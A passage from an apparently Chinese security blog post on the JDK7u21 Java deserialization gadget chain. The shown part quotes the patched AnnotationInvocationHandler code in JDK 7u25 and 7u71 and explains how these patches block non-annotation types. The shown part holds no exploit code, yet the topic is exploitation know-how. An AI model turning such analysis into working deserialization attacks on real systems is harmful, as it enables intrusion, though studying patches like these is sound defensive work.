catch(IllegalArgumentException e) { // Class is no longer an annotation type; all bets are off return; } //JDK7u25 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } 可以看到新版本直接抛出异常，而不是正常返回null\n还有一处修复\nJDK7u71-b04\nAnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; type, Map\u0026lt;String, Object\u0026gt; memberValues) { Class\u0026lt;?\u0026gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(\u0026#34;Attempt to create proxy for a non-annotation type.\u0026#34;); this.type = type; this.memberValues = memberValues; } 这两处限制了type的类型必须为注释类，否则报错\n本文原载于0ZHan\u0026rsquo;s Blog，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。\n","date":"2024-03-25T19:43:16+08:00","permalink":"/p/jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/","title":"JDK7u21原生链"}]